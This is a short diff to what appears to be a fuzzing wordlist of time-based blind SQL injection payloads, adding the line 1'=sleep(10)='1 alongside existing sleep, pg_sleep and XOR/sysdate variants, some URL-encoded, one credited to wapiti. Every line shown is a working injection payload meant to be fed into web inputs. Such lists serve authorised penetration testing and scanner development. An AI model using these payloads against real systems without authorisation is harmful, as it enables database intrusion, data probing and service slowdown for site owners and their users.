@@ -7,6 +7,7 @@ if(now()=sysdate(),sleep(3),0)/*'XOR(if(now()=sysdate(),sleep(3),0))OR'"XOR(if(n
 %2c(select*from(select(sleep(30)))a)
 %27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
 -sleep(5)
+1'=sleep(10)='1 
 # from wapiti
 sleep(5)#
 1 or sleep(5)#
